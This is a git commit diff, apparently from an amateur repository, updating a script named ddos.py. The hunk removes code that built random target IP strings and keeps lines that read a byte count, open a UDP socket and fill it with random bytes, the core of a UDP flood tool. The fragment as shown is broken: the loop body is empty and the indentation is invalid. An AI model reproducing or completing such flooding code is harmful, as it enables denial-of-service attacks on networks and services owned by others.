4d866d56577763287dbfad73f0249730a203edf5
Fabri15544 <51274314+Fabri15544@users.noreply.github.com>
2020-01-17 22:14:21 -0300

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -12,13 +12,6 @@ i = 1
 packetes = input("Bytes :")
 #Multiples IPS
 while True:
-   a = str(random.randint(1,5))
-   b = str(random.randint(1,5))
-   c = str(random.randint(1,1))
-   d = str(random.randint(1,1))
-   dot = str(random.randint(1,2))
-   target_host = a + dot + b + dot + c + dot + d
-      
 #packet
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(packetes)
